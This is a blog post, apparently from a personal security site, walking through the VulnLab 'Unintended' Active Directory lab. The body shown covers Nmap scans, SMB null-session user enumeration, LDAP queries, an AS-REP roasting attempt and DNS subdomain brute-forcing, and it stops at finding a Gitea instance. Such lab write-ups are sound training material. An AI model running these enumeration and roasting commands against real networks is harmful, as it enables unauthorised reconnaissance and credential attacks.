@@ -1,0 +1,611 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Unintended VulnLab Chain - Complete Walkthrough and WriteupWelcome to this comprehensive walkthrough and writeup for the Unintended chain from VulnLab, a challenging Pro-Lab now on Hack the Box. This">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VL-Unintended">
+<meta property="og:url" content="https://panosoikogr.github.io/2025/11/06/VL-Unintended/index.html">
+<meta property="og:site_name" content="Panosoiko Cybersecurity Blog">
+<meta property="og:description" content="Unintended VulnLab Chain - Complete Walkthrough and WriteupWelcome to this comprehensive walkthrough and writeup for the Unintended chain from VulnLab, a challenging Pro-Lab now on Hack the Box. This">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/countdown-80.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/mattermost.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/duplicati.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/Nullauth-users.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/good-dns-enum.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/Gitea-Access.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/shh-sftp.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/mysql-stuff.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/Vlid-pass-juan.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/gitea-pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/postrgress-db.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/repo-postgress-default-pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/postr-hashes.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/john-pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/abbie-mattermost.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/abbie-ssh.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/root-backup.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/frp-admin-pass.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/backyps-on-ftp.png">
+<meta property="og:image" content="https://panosoikogr.github.io/images/Unintended/secrets-extract.png">
+<meta property="article:published_time" content="2025-11-06T10:59:42.000Z">
+<meta property="article:modified_time" content="2025-11-06T11:07:36.964Z">
+<meta property="article:author" content="Panosoiko">
+<meta property="article:tag" content="Chain">
+<meta property="article:tag" content="Linux">
+<meta property="article:tag" content="ProLab">
+<meta property="article:tag" content="VulnLab">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://panosoikogr.github.io/images/Unintended/countdown-80.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>VL-Unintended</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-73BMC8ZHB7"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-73BMC8ZHB7');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/11/04/VL-Puppet/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://panosoikogr.github.io/2025/11/06/VL-Unintended/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&text=VL-Unintended"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&is_video=false&description=VL-Unintended"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VL-Unintended&body=Check out this article: https://panosoikogr.github.io/2025/11/06/VL-Unintended/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&title=VL-Unintended"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&name=VL-Unintended&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://panosoikogr.github.io/2025/11/06/VL-Unintended/&t=VL-Unintended"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Unintended-VulnLab-Chain-Complete-Walkthrough-and-Writeup"><span class="toc-number">1.</span> <span class="toc-text">Unintended VulnLab Chain - Complete Walkthrough and Writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Initial-Reconnaissance"><span class="toc-number">1.1.</span> <span class="toc-text">Initial Reconnaissance</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-DC-10-10-231-229"><span class="toc-number">1.1.1.</span> <span class="toc-text">Nmap Scan - DC (10.10.231.229)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Web-Server-10-10-231-230"><span class="toc-number">1.1.2.</span> <span class="toc-text">Nmap Scan - Web Server (10.10.231.230)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nmap-Scan-Backup-Server-10-10-231-231"><span class="toc-number">1.1.3.</span> <span class="toc-text">Nmap Scan - Backup Server (10.10.231.231)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Active-Directory-Enumeration"><span class="toc-number">1.2.</span> <span class="toc-text">Active Directory Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SMB-Null-Authentication"><span class="toc-number">1.2.1.</span> <span class="toc-text">SMB Null Authentication</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#LDAP-Enumeration"><span class="toc-number">1.2.2.</span> <span class="toc-text">LDAP Enumeration</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#AS-REP-Roasting-Attempt"><span class="toc-number">1.2.3.</span> <span class="toc-text">AS-REP Roasting Attempt</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DNS-Enumeration-Critical-Discovery"><span class="toc-number">1.3.</span> <span class="toc-text">DNS Enumeration - Critical Discovery</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gitea-Repository-Discovery"><span class="toc-number">1.4.</span> <span class="toc-text">Gitea Repository Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Repository-Analysis-DevOps-Repo"><span class="toc-number">1.4.1.</span> <span class="toc-text">Repository Analysis - DevOps Repo</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SFTP-Access-and-Tunneling"><span class="toc-number">1.5.</span> <span class="toc-text">SFTP Access and Tunneling</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-SFTP-Connection"><span class="toc-number">1.5.1.</span> <span class="toc-text">Initial SFTP Connection</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Dynamic-Port-Forwarding"><span class="toc-number">1.5.2.</span> <span class="toc-text">SSH Dynamic Port Forwarding</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Internal-Network-Scanning"><span class="toc-number">1.5.3.</span> <span class="toc-text">Internal Network Scanning</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MySQL-Database-Exploitation"><span class="toc-number">1.6.</span> <span class="toc-text">MySQL Database Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Access"><span class="toc-number">1.6.1.</span> <span class="toc-text">Database Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gitea-User-Credential-Extraction"><span class="toc-number">1.6.2.</span> <span class="toc-text">Gitea User Credential Extraction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking"><span class="toc-number">1.6.3.</span> <span class="toc-text">Hash Cracking</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credentials-Found"><span class="toc-number">1.6.4.</span> <span class="toc-text">Credentials Found:</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Gitea-Administrator-Access"><span class="toc-number">1.7.</span> <span class="toc-text">Gitea Administrator Access</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Home-Backup-Repository"><span class="toc-number">1.7.1.</span> <span class="toc-text">Home Backup Repository</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LDAP-Enumeration-with-Valid-Credentials"><span class="toc-number">1.8.</span> <span class="toc-text">LDAP Enumeration with Valid Credentials</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Computer-Enumeration"><span class="toc-number">1.8.1.</span> <span class="toc-text">Computer Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Lateral-Movement-Web-Server"><span class="toc-number">1.9.</span> <span class="toc-text">Lateral Movement - Web Server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Access-as-Juan"><span class="toc-number">1.9.1.</span> <span class="toc-text">SSH Access as Juan</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Initial-Host-Enumeration"><span class="toc-number">1.9.2.</span> <span class="toc-text">Initial Host Enumeration</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mattermost-Access-and-Intelligence-Gathering"><span class="toc-number">1.10.</span> <span class="toc-text">Mattermost Access and Intelligence Gathering</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Chat-Log-Analysis"><span class="toc-number">1.10.1.</span> <span class="toc-text">Chat Log Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PostgreSQL-Discovery"><span class="toc-number">1.10.2.</span> <span class="toc-text">PostgreSQL Discovery</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mattermost-Database-Exploitation"><span class="toc-number">1.11.</span> <span class="toc-text">Mattermost Database Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Default-Credential-Research"><span class="toc-number">1.11.1.</span> <span class="toc-text">Default Credential Research</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Database-Access-1"><span class="toc-number">1.11.2.</span> <span class="toc-text">Database Access</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#User-Credential-Extraction"><span class="toc-number">1.11.3.</span> <span class="toc-text">User Credential Extraction</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Password-Cracking-Custom-Wordlist"><span class="toc-number">1.12.</span> <span class="toc-text">Password Cracking - Custom Wordlist</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Intelligence-Driven-Approach"><span class="toc-number">1.12.1.</span> <span class="toc-text">Intelligence-Driven Approach</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hash-Cracking-1"><span class="toc-number">1.12.2.</span> <span class="toc-text">Hash Cracking</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Credential-Discovery"><span class="toc-number">1.13.</span> <span class="toc-text">Domain Credential Discovery</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Mattermost-as-Abbie"><span class="toc-number">1.13.1.</span> <span class="toc-text">Mattermost as Abbie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Credential-Validation"><span class="toc-number">1.13.2.</span> <span class="toc-text">Credential Validation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Privilege-Escalation-Backup-Server"><span class="toc-number">1.14.</span> <span class="toc-text">Privilege Escalation - Backup Server</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#SSH-Access-as-Abbie"><span class="toc-number">1.14.1.</span> <span class="toc-text">SSH Access as Abbie</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker-Group-Membership"><span class="toc-number">1.14.2.</span> <span class="toc-text">Docker Group Membership</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Root-Privilege-Escalation"><span class="toc-number">1.14.3.</span> <span class="toc-text">Root Privilege Escalation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Administrator-Credentials"><span class="toc-number">1.14.4.</span> <span class="toc-text">FTP Administrator Credentials</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Domain-Administrator-Compromise"><span class="toc-number">1.15.</span> <span class="toc-text">Domain Administrator Compromise</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Backup-Analysis"><span class="toc-number">1.15.1.</span> <span class="toc-text">FTP Backup Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NTDS-dit-Secrets-Extraction"><span class="toc-number">1.15.2.</span> <span class="toc-text">NTDS.dit Secrets Extraction</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pass-the-Hash-Attack"><span class="toc-number">1.15.3.</span> <span class="toc-text">Pass-the-Hash Attack</span></a></li></ol></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        VL-Unintended
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">Panosoiko</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-11-06T10:59:42.000Z" class="dt-published" itemprop="datePublished">2025-11-06</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/Chain/" rel="tag">Chain</a>, <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>, <a class="p-category" href="/tags/ProLab/" rel="tag">ProLab</a>, <a class="p-category" href="/tags/VulnLab/" rel="tag">VulnLab</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h1 id="Unintended-VulnLab-Chain-Complete-Walkthrough-and-Writeup"><a href="#Unintended-VulnLab-Chain-Complete-Walkthrough-and-Writeup" class="headerlink" title="Unintended VulnLab Chain - Complete Walkthrough and Writeup"></a>Unintended VulnLab Chain - Complete Walkthrough and Writeup</h1><p>Welcome to this comprehensive walkthrough and writeup for the <strong>Unintended</strong> chain from VulnLab, a challenging Pro-Lab now on Hack the Box. This detailed guide covers the complete exploitation path through a multi-machine Active Directory environment, demonstrating real-world attack techniques used in professional penetration testing engagements.</p>
+<p><strong>Chain Difficulty</strong>: Medium<br><strong>Lab Type</strong>: VulnLab - HTB Chain &#x2F; Pro-Lab<br><strong>Skills Required</strong>: Active Directory enumeration, lateral movement, privilege escalation, Docker exploitation  </p>
+<p>This writeup is designed for penetration testers and ethical hackers looking to enhance their skills in complex multi-host environments. Whether you’re preparing for OSCP, OSEP, or simply improving your red team capabilities, this walkthrough provides valuable insights into comprehensive network exploitation.</p>
+<hr>
+<h2 id="Initial-Reconnaissance"><a href="#Initial-Reconnaissance" class="headerlink" title="Initial Reconnaissance"></a>Initial Reconnaissance</h2><p>We initially discover three IP addresses in the target environment:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">10.10.231.229 DC.unintended.vl</span><br><span class="line">10.10.231.230 web</span><br><span class="line">10.10.231.231 backup</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-Scan-DC-10-10-231-229"><a href="#Nmap-Scan-DC-10-10-231-229" class="headerlink" title="Nmap Scan - DC (10.10.231.229)"></a>Nmap Scan - DC (10.10.231.229)</h3><p>Running a comprehensive Nmap scan against the domain controller reveals:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE      REASON         VERSION</span><br><span class="line">22/tcp    open  ssh          syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 </span><br><span class="line">53/tcp    open  domain       syn-ack ttl 63 (generic dns response: NOTIMP)</span><br><span class="line">88/tcp    open  kerberos-sec syn-ack ttl 63 (server time: 2025-11-05 18:58:58Z)</span><br><span class="line">135/tcp   open  msrpc        syn-ack ttl 63 Microsoft Windows RPC</span><br><span class="line">139/tcp   open  netbios-ssn  syn-ack ttl 63 Samba smbd 4.6.2</span><br><span class="line">389/tcp   open  ldap         syn-ack ttl 63 (Anonymous bind OK)</span><br><span class="line">445/tcp   open  netbios-ssn  syn-ack ttl 63 Samba smbd 4.6.2</span><br><span class="line">464/tcp   open  kpasswd5?    syn-ack ttl 63</span><br><span class="line">636/tcp   open  ssl/ldap     syn-ack ttl 63 (Anonymous bind OK)</span><br><span class="line">3268/tcp  open  ldap         syn-ack ttl 63 (Anonymous bind OK)</span><br><span class="line">3269/tcp  open  ssl/ldap     syn-ack ttl 63 (Anonymous bind OK)</span><br><span class="line">49152/tcp open  msrpc        syn-ack ttl 63 Microsoft Windows RPC</span><br><span class="line">49153/tcp open  msrpc        syn-ack ttl 63 Microsoft Windows RPC</span><br><span class="line">49154/tcp open  msrpc        syn-ack ttl 63 Microsoft Windows RPC</span><br></pre></td></tr></table></figure>
+
+<p><strong>Key Observations:</strong></p>
+<ul>
+<li>Linux-based Active Directory Domain Controller (Samba)</li>
+<li>Anonymous LDAP bind enabled - excellent enumeration vector</li>
+<li>SSL certificate reveals: <code>commonName=DC.unintended.vl</code></li>
+</ul>
+<p>Let’s add the domain to our <code>/etc/hosts</code> file:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unintended.vl DC.unintended.vl</span><br></pre></td></tr></table></figure>
+
+<h3 id="Nmap-Scan-Web-Server-10-10-231-230"><a href="#Nmap-Scan-Web-Server-10-10-231-230" class="headerlink" title="Nmap Scan - Web Server (10.10.231.230)"></a>Nmap Scan - Web Server (10.10.231.230)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PORT     STATE SERVICE REASON         VERSION</span><br><span class="line">22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6</span><br><span class="line">80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.52</span><br><span class="line">8065/tcp open  unknown syn-ack ttl 62</span><br><span class="line">8200/tcp open  http    syn-ack ttl 62 Duplicati httpserver</span><br></pre></td></tr></table></figure>
+
+<p><strong>Discovered Services:</strong></p>
+<p><strong>Port 80</strong> - Under Construction page with countdown timer:<br><img src="/images/Unintended/countdown-80.png" alt="Countdown page on port 80"></p>
+<p>Notable finding: Email address <code>admin@web.unintended.vl</code> discovered in page source.</p>
+<p><strong>Port 8065</strong> - Mattermost instance (team collaboration platform):<br><img src="/images/Unintended/mattermost.png" alt="Mattermost login page"></p>
+<p><strong>Port 8200</strong> - Duplicati backup service:<br><img src="/images/Unintended/duplicati.png" alt="Duplicati login interface"></p>
+<h3 id="Nmap-Scan-Backup-Server-10-10-231-231"><a href="#Nmap-Scan-Backup-Server-10-10-231-231" class="headerlink" title="Nmap Scan - Backup Server (10.10.231.231)"></a>Nmap Scan - Backup Server (10.10.231.231)</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE REASON         VERSION</span><br><span class="line">21/tcp open  ftp     syn-ack ttl 63 pyftpdlib 1.5.7</span><br><span class="line">22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Active-Directory-Enumeration"><a href="#Active-Directory-Enumeration" class="headerlink" title="Active Directory Enumeration"></a>Active Directory Enumeration</h2><h3 id="SMB-Null-Authentication"><a href="#SMB-Null-Authentication" class="headerlink" title="SMB Null Authentication"></a>SMB Null Authentication</h3><p>Testing for null authentication on the domain controller:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nxc smb dc -u &#x27;&#x27; -p &#x27;&#x27; --users</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/Nullauth-users.png" alt="Null authentication user enumeration"></p>
+<p><strong>Discovered Users:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">juan</span><br><span class="line">abbie</span><br><span class="line">cartor</span><br></pre></td></tr></table></figure>
+
+<h3 id="LDAP-Enumeration"><a href="#LDAP-Enumeration" class="headerlink" title="LDAP Enumeration"></a>LDAP Enumeration</h3><p>Extracting base LDAP information:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ldapsearch -H ldap://dc.unintended.vl -x -LLL -s base</span><br></pre></td></tr></table></figure>
+
+<h3 id="AS-REP-Roasting-Attempt"><a href="#AS-REP-Roasting-Attempt" class="headerlink" title="AS-REP Roasting Attempt"></a>AS-REP Roasting Attempt</h3><p>Checking for accounts without Kerberos pre-authentication:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GetNPUsers.py -usersfile ~/Downloads/unin/usernames.txt -request -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.231.229 unintended.vl/</span><br></pre></td></tr></table></figure>
+
+<p>Unfortunately, no accounts have the <code>DONT_REQUIRE_PREAUTH</code> flag set.</p>
+<hr>
+<h2 id="DNS-Enumeration-Critical-Discovery"><a href="#DNS-Enumeration-Critical-Discovery" class="headerlink" title="DNS Enumeration - Critical Discovery"></a>DNS Enumeration - Critical Discovery</h2><p>With standard attack vectors exhausted, we pivot to DNS enumeration:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsenum --dnsserver 10.10.231.229 --enum -p 0 -s 0 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt unintended.vl</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Unintended/good-dns-enum.png" alt="DNS enumeration results"></p>
+<p><strong>Discovered DNS Records:</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">web.unintended.vl.                       900      IN    A        10.10.10.12</span><br><span class="line">web.unintended.vl.                       900      IN    A        10.10.180.22</span><br><span class="line">backup.unintended.vl.                    900      IN    A        10.10.10.13</span><br><span class="line">backup.unintended.vl.                    900      IN    A        10.10.180.23</span><br><span class="line">chat.unintended.vl.                      900      IN    A        10.10.180.22</span><br><span class="line">dc.unintended.vl.                        3600     IN    A        10.10.180.21</span><br><span class="line">code.unintended.vl.                      900      IN    A        10.10.10.12</span><br><span class="line">code.unintended.vl.                      900      IN    A        10.10.180.22</span><br><span class="line">gc._msdcs.unintended.vl.                 900      IN    A        10.10.180.21</span><br><span class="line">domaindnszones.unintended.vl.            900      IN    A        10.10.180.21</span><br><span class="line">forestdnszones.unintended.vl.            900      IN    A        10.10.180.21</span><br></pre></td></tr></table></figure>
+
+<p><strong>Analysis:</strong></p>
+<ul>
+<li>Internal IPs differ from external IPs</li>
+<li><code>dc.unintended.vl</code> → <code>10.10.180.21</code></li>
+<li><code>10.10.10.12</code> &#x2F; <code>10.10.180.22</code> → <code>10.10.231.230</code> (web server)</li>
+<li><code>10.10.10.13</code> &#x2F; <code>10.10.180.23</code> → <code>10.10.231.231</code> (backup server)</li>
+</ul>
+<p>Update <code>/etc/hosts</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">10.10.231.230 web.unintended.vl chat.unintended.vl code.unintended.vl</span><br><span class="line">10.10.231.231 backup.unintended.vl</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Gitea-Repository-Discovery"><a href="#Gitea-Repository-Discovery" class="headerlink" title="Gitea Repository Discovery"></a>Gitea Repository Discovery</h2><p>Accessing <code>http://code.unintended.vl/</code> reveals a Gitea instance:</p>
+<p><img src="/images/Unintended/Gitea-Access.png" alt="Gitea code repository"></p>
